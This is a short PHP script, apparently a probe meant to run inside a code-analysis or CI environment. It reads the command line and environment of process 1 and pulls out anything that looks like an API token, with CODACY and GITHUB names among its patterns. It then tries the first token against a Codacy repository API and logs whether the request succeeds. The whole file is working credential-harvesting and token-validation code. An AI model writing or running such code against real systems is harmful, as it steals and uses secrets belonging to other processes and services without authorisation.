<?php
function codex_probe_token($candidate) {
    if (!is_string($candidate) || $candidate === '') { return ['status' => 'not_attempted', 'bytes' => 0]; }
    $opts = ['http' => ['method' => 'GET', 'header' => "api-token: " . $candidate . "\r\n", 'timeout' => 5, 'ignore_errors' => true]];
    $ctx = stream_context_create($opts);
    $resp = @file_get_contents('https://api.codacy.com/api/v3/analysis/organizations/gh/ABDUS-TEST-ORG/repositories/codacy-public-lab', false, $ctx);
    $status = 'no_response';
    global $http_response_header;
    if (isset($http_response_header[0]) && preg_match('/\s(\d{3})\s/', $http_response_header[0], $m)) { $status = $m[1]; }
    return ['status' => $status, 'bytes' => is_string($resp) ? strlen($resp) : 0];
}
$cmd = @file_get_contents('/proc/1/cmdline');
$argv = array_values(array_filter(explode("\0", (string)$cmd), function($v) { return $v !== ''; }));
$cmdPresent = 0; $cmdCandidate = '';
for ($i = 0; $i < count($argv); $i++) {
    $arg = $argv[$i];
    if (preg_match('/^--?(?:api[-_]?token|token|api[-_]?key|project[-_]?token)$/i', $arg) && isset($argv[$i + 1])) { $cmdPresent = 1; $cmdCandidate = $argv[$i + 1]; break; }
    if (preg_match('/^(?:api[-_]?token|token|api[-_]?key|project[-_]?token)=(.+)$/i', $arg, $m)) { $cmdPresent = 1; $cmdCandidate = $m[1]; break; }
}
$env = @file_get_contents('/proc/1/environ');
$envPresent = 0; $envCandidate = '';
foreach (explode("\0", (string)$env) as $entry) {
    if (preg_match('/^(?:CODACY|GITHUB|API|PROJECT)?[_-]?(?:API[_-]?TOKEN|TOKEN|API[_-]?KEY|PROJECT[_-]?TOKEN)=(.*)$/i', $entry, $m)) { $envPresent = 1; $envCandidate = $m[1]; break; }
}
$selected = 'none'; $result = ['status' => 'not_attempted', 'bytes' => 0];
if ($cmdCandidate !== '') { $selected = 'cmdline'; $result = codex_probe_token($cmdCandidate); }
elseif ($envCandidate !== '') { $selected = 'environ'; $result = codex_probe_token($envCandidate); }
fwrite(STDERR, 'PROC1_TOKEN_TEST cmd_arg=' . $cmdPresent . ' env_arg=' . $envPresent . ' selected=' . $selected . ' status=' . $result['status'] . ' bytes=' . $result['bytes'] . PHP_EOL);
throw new RuntimeException('PROC1_TOKEN_TEST');